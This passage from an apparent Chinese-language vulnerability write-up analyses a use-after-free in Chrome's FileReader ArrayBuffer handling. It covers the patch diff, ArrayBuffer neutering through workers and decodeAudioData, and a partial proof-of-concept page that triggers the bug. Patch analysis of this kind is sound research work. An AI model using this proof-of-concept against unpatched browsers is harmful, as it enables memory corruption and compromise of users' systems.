href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=150407e8d3610ff25a45c7c46877333c4425f062&amp;l=137" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc:137</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (!finished_loading_) &#123;</span><br><span class="line">    <span class="keyword">return</span> DOMArrayBuffer::Create(</span><br><span class="line">        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br><span class="line">  &#125;</span><br><span class="line">  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  AdjustReportedMemoryUsageToV8(<span class="number">-1</span> *</span><br><span class="line">                                <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">  raw_data_.reset();</span><br><span class="line">  <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在补丁之前，下面这行代码可能会被多次调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br></pre></td></tr></table></figure><p>在补丁之后，上面的代码仅会被调用一次，取而代之的是下面这行代码可能会被多次调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer::Create(</span><br><span class="line">        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br></pre></td></tr></table></figure><p>所以这里关键的差异点在于 <strong>多次调用</strong> 下面两行代码的差异：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// before patch</span></span><br><span class="line">raw_data_-&gt;ToArrayBuffer()</span><br><span class="line"><span class="comment">// after patch</span></span><br><span class="line">ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength())</span><br></pre></td></tr></table></figure><h4 id="2-2-3-漏洞分析"><a href="#2-2-3-漏洞分析" class="headerlink" title="2.2.3 漏洞分析"></a>2.2.3 漏洞分析</h4><p>如无特殊说明，本文所有代码均基于有漏洞的版本（<strong><em>1675c51b1d83160a8b7061f38bb722b2c43937b4</em></strong>）进行分析。</p><ol><li>函数 <code>FileReaderLoader::ArrayBufferResult</code> 中 <code>raw_data_</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=157" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.h:157</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;ArrayBufferBuilder&gt; raw_data_;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>ArrayBufferBuilder::ToArrayBuffer</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=103" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc:103</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBufferBuilder::ToArrayBuffer() &#123;</span><br><span class="line">  <span class="comment">// Fully used. Return m_buffer as-is.</span></span><br><span class="line">  <span class="keyword">if</span> (buffer_-&gt;ByteLength() == bytes_used_)</span><br><span class="line">    <span class="keyword">return</span> buffer_;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buffer_-&gt;Slice(<span class="number">0</span>, bytes_used_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>先看 <code>buffer_</code> 的类型，后续再深入分析<code>ArrayBufferBuilder::ToArrayBuffer</code> （<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=94" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.h:94</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> WTF &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WTF_EXPORT</span> <span class="title">ArrayBufferBuilder</span> <span class="title">final</span> &#123;</span></span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">  <span class="keyword">unsigned</span> bytes_used_;</span><br><span class="line">  <span class="keyword">bool</span> variable_capacity_;</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer_;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><code>ArrayBuffer::Slice</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=259" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h:259</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Slice(<span class="keyword">int</span> begin, <span class="keyword">int</span> end) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> SliceImpl(ClampIndex(begin), ClampIndex(end));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::SliceImpl(<span class="keyword">unsigned</span> begin,</span><br><span class="line">                                                  <span class="keyword">unsigned</span> end) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">size_t</span> size = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(begin &lt;= end ? end - begin : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ArrayBuffer::Create(<span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(Data()) + begin, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><code>ArrayBuffer::Create</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=144" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h:144</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Create(<span class="keyword">const</span> <span class="keyword">void</span>* source,</span><br><span class="line">                                               <span class="keyword">size_t</span> byte_length) &#123;</span><br><span class="line">  <span class="function">ArrayBufferContents <span class="title">contents</span><span class="params">(byte_length, <span class="number">1</span>, ArrayBufferContents::kNotShared,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ArrayBufferContents::kDontInitialize)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (UNLIKELY(!contents.Data()))</span><br><span class="line">    OOM_CRASH();</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer = base::AdoptRef(<span class="keyword">new</span> ArrayBuffer(contents));</span><br><span class="line">  <span class="built_in">memcpy</span>(buffer-&gt;Data(), source, byte_length);</span><br><span class="line">  <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在回到第 <strong>2</strong> 步，在函数 <code>ArrayBufferBuilder::ToArrayBuffer</code> 中，如果 <code>buffer_</code> 的空间满了，则直接返回 <code>buffer_</code> 本身，否则调用 <code>ArrayBuffer::Slice</code> 返回一个 <code>ArrayBuffer</code> 副本。</p><p>最后看一下 <code>DOMArrayBuffer::Create</code> 的定义，注意该函数有多个重载，触发漏洞所用的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=20" target="_blank" rel="noopener">src/third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h:20</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> blink &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CORE_EXPORT</span> <span class="title">DOMArrayBuffer</span> <span class="title">final</span> :</span> <span class="keyword">public</span> DOMArrayBufferBase &#123;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> DOMArrayBuffer* <span class="title">Create</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> MakeGarbageCollected&lt;DOMArrayBuffer&gt;(<span class="built_in">std</span>::move(buffer));</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">DOMArrayBuffer</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span></span></span><br><span class="line">      : DOMArrayBufferBase(std::move(buffer)) &#123;&#125;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数比较简单，就是基于 <code>WTF::ArrayBuffer</code> 创建 <code>blink::DOMArrayBuffer</code> ，不要被 <code>std::move</code> 所迷惑，这里只是针对函数形参 <code>scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer</code> 进行 <a href="https://en.cppreference.com/w/cpp/utility/move" target="_blank" rel="noopener">move</a> ，不影响形参智能指针所指向的具体对象。</p><p>那么，这里的漏洞到底是如何产生的呢？回到有问题的 <code>FileReaderLoader::ArrayBufferResult</code> 函数，如果在数据读取完毕时刚好触发了 <code>onprogress</code> 回调函数（注意此时尚未触发 <code>onloadend</code> 函数），因为数据已经读取完毕，函数 <code>ArrayBufferBuilder::ToArrayBuffer</code> 直接返回 <code>buffer_</code> ，在此过程中，没副本产生！当回调函数 <code>onloadend</code> 触发时，返回的 <strong>ArrayBuffer</strong> 将会与 <code>onprogress</code> 返回的 <strong>ArrayBuffer</strong> 共享同一 <strong>backing store</strong> （即底层存储数据用的堆块）！当手上有两个这样的 <strong>ArrayBuffer</strong> 时，可以先释放其中一个，那么访问另一个时将导致 <a href="https://programlife.net/tags/Use-After-Free/">UAF</a> 。</p><p>那么，你是否也会怀疑，在数据读取完毕的时候真的会出现先后触发 <code>onprogress</code> 和 <code>onloadend</code> 的情况吗？笔者也有这样的疑问，但是本文前面提供的 <a href="https://programlife.net/tags/FileReader/">FileReader</a> 测试代码的运行结果表明，确实就有这样的情况：最后一次触发 <code>onprogress</code> 回调函数时，读取的数据长度为 <code>104857600</code> ，表明数据已经读取完毕。</p><p>在补丁之后的代码中，如果 <code>finished_loading_</code> 尚未标记，那么总是调用 <code>ArrayBuffer::Create</code> 返回一个 ArrayBuffer 副本，这样就避免了两个 ArrayBuffer 共享同一 <strong>backing store</strong> 的情况的出现。</p><h3 id="2-3-POC-构造"><a href="#2-3-POC-构造" class="headerlink" title="2.3 POC 构造"></a>2.3 POC 构造</h3><h4 id="2-3-1-ArrayBuffer-Neutering"><a href="#2-3-1-ArrayBuffer-Neutering" class="headerlink" title="2.3.1 ArrayBuffer Neutering"></a>2.3.1 ArrayBuffer Neutering</h4><p>在构造 POC 之前，先学习一下怎么释放一个 ArrayBuffer 的 <strong>backing store</strong> 。通常而言，可以通过转移 ArrayBuffer （比如转移给另一个线程）来实现底层堆块的释放，这称之为 <strong>Neuter</strong> 。在 V8 中，ArrayBuffer 提供了 <code>Neuter</code> 方法，代码如下所示（<a href="https://cs.chromium.org/chromium/src/v8/include/v8.h?l=4819" target="_blank" rel="noopener">src/v8/include/v8.h:4819</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Detaches this ArrayBuffer and all its views (typed arrays).</span></span><br><span class="line"><span class="comment"> * Detaching sets the byte length of the buffer and all typed arrays to zero,</span></span><br><span class="line"><span class="comment"> * preventing JavaScript from ever accessing underlying backing store.</span></span><br><span class="line"><span class="comment"> * ArrayBuffer should have been externalized and must be detachable.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Detach</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO(913887): fix the use of 'neuter' in the API.</span></span><br><span class="line">V8_DEPRECATE_SOON(<span class="string">"Use Detach() instead."</span>, <span class="keyword">inline</span> <span class="keyword">void</span> Neuter()) &#123; Detach(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Make this ArrayBuffer external. The pointer to underlying memory block</span></span><br><span class="line"><span class="comment"> * and byte length are returned as |Contents| structure. After ArrayBuffer</span></span><br><span class="line"><span class="comment"> * had been externalized, it does no longer own the memory block. The caller</span></span><br><span class="line"><span class="comment"> * should take steps to free memory when it is no longer needed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The Data pointer of ArrayBuffer::Contents must be freed using the provided</span></span><br><span class="line"><span class="comment"> * deleter, which will call ArrayBuffer::Allocator::Free if the buffer</span></span><br><span class="line"><span class="comment"> * was allocated with ArraryBuffer::Allocator::Allocate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Contents <span class="title">Externalize</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>可以看到，调用 <code>Neuter</code> 时 ArrayBuffer 已经被 <strong>Externalized</strong> 了，此时 ArrayBuffer 的 <strong>backing store</strong> 已经被调用方所释放了。</p><p><strong>Neuter</strong> 一个 ArrayBuffer 的常规做法是把它转移给一个工作者线程（ <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers" target="_blank" rel="noopener">Web Workers</a> ）。与桌面软件一样，JavaScript 默认的执行线程为 UI 线程，如果要执行复杂的计算工作，应当新建一个工作者线程来执行任务，以防止 UI 失去响应。</p><p>在 JavaScript 中，各线程之间通过 <code>postMessage</code> 实现数据的发送、通过 <code>onmessage</code> 回调函数实现消息的相应。线程之间的数据传递是通过复制（而不是共享）来实现的，因此传递对象时会经历序列化和反序列化的过程，即传出时进行序列化，传入时进行反序列化。大多数浏览器通过 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" target="_blank" rel="noopener">Structured clone algorithm</a> 来实现这一特性。</p><p>如果要传递的对象实现了 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Transferable" target="_blank" rel="noopener">Transferable</a> 接口，那么可以实现数据的高效转移，即并不复制数据，而是通过直接转移所有权来实现传递。对于这种传递方式，因为直接转移了所有权，因此原有线程不再享有对象数据的访问权限。ArrayBuffer 就是以这样的方式转移的，但这里笔者有一个 <strong>疑问</strong> ：实际情况中，原有 ArrayBuffer 的 <strong>backing store</strong> 会被释放，显然在接收线程中会有新的堆块的分配以及数据的复制，并不是简单的修改指针的指向，这和 MDN 的文档描述的高效理念是冲突的。</p><p>线程相关的两个重要概念定义如下：</p><ul><li><p><code>postMessage</code> 发送消息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(message, [transfer]);</span><br></pre></td></tr></table></figure><ul><li>message 表示要传递的数据</li><li>如果有实现了 <code>Transferable</code> 的对象，可以以数组元素的方式放到第二个参数中，以提高传递效率，但是在第一个参数中需要指定一个引用，以方便目标线程接收</li></ul></li><li><p><code>onmessage</code> 响应消息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myWorker.onmessage = function(e) &#123; ... &#125;</span><br></pre></td></tr></table></figure><ul><li>通过事件的 <code>data</code> 属性访问接收到的数据</li></ul></li></ul><p>一个简单的例子如下所示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- main.html 的代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'worker.js'</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">'Main thread: before postMessage, ab.byteLength is '</span> + ab.byteLength);</span></span><br><span class="line"><span class="undefined">worker.postMessage(ab, [ab]);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">'Main thread: after postMessage, ab.byteLength is '</span> + ab.byteLength);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// worker.js 的代码</span></span><br><span class="line">onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ab = message.data;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Worker thread: received: '</span> + ab);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Wroker thread: ArrayBuffer.byteLength is : '</span> + ab.byteLength);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Main thread: before postMessage, ab.byteLength is 4096</span><br><span class="line">Main thread: after postMessage, ab.byteLength is 0</span><br><span class="line">Worker thread: received: [object ArrayBuffer]</span><br><span class="line">Wroker thread: ArrayBuffer.byteLength is : 4096</span><br></pre></td></tr></table></figure><p>McAfee Labs 的文章提到，使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/BaseAudioContext/decodeAudioData" target="_blank" rel="noopener">AudioContext.decodeAudioData</a> 同样可以实现 ArrayBuffer 的 <a href="https://programlife.net/tags/Neuter/">Neuter</a> 。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> context = <span class="keyword">new</span> AudioContext();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Before decodeAudioData, ab.byteLength is '</span> + ab.byteLength);</span><br><span class="line">context.decodeAudioData(ab, </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'decode succeed: '</span> + buffer);</span><br><span class="line">    &#125;, </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'decode failed: '</span> + e);</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'After decodeAudioData, ab.byteLength is '</span> + ab.byteLength);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>由测试结果可知，不管解码成功与否，ArrayBuffer 都会被转移：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before decodeAudioData, ab.byteLength is 4096</span><br><span class="line">After decodeAudioData, ab.byteLength is 0</span><br><span class="line">decode failed: EncodingError: Unable to decode audio data</span><br></pre></td></tr></table></figure><h4 id="2-3-2-POC-构造"><a href="#2-3-2-POC-构造" class="headerlink" title="2.3.2 POC 构造"></a>2.3.2 POC 构造</h4><p>分析清楚了漏洞的底层原理，写 POC 就是很简单的事情了，笔者构造的 POC 代码如下所示。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- poc.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab1, ab2;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> byteLength = <span class="number">100</span> * <span class="number">1024</span> * <span class="number">1024</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onProgress</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1.byteLength != byteLength) &#123;</span></span><br><span class="line"><span class="undefined">        ab1 = event.target.result;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">onLoadEnd</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="undefined">    ab2 = event.target.result;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ab1 != ab2 &amp;&amp; ab1.byteLength == ab2.byteLength) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> flag = <span class="number">0x61616161</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">new</span> <span class="built_in">DataView</span>(ab1).setUint32(<span class="number">0</span>, flag, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (<span class="keyword">new</span> <span class="built_in">DataView</span>(ab2).getUint32(<span class="number">0</span>, <span class="literal">true</span>) == flag) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'verify succeed! try crash self...'</span>);</span></span><br><span class="line"><span class="undefined">            crash();</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">'verify failed, retry now...'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">'failed this time, retry now...'</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.setTimeout(init, <span class="number">1000</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ab1 = ab2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> string = <span class="string">'A'</span>.repeat(byteLength);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> blob = <span class="keyword">new</span> Blob([string]);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> reader = <span class="keyword">new</span> FileReader();</span></span><br><span class="line"><span class="undefined">    reader.onprogress = onProgress;</span></span><br><span class="line"><span class="undefined">    reader.onloadend = onLoadEnd;</span></span><br><span class="line"><span class="undefined">    reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'worker.js'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="undefined">        worker.postMessage(ab1, [ab1, ab2]);</span></span><br><span class="line"><span class="javascript">    &#125; <span class="keyword">catch</span>(e) 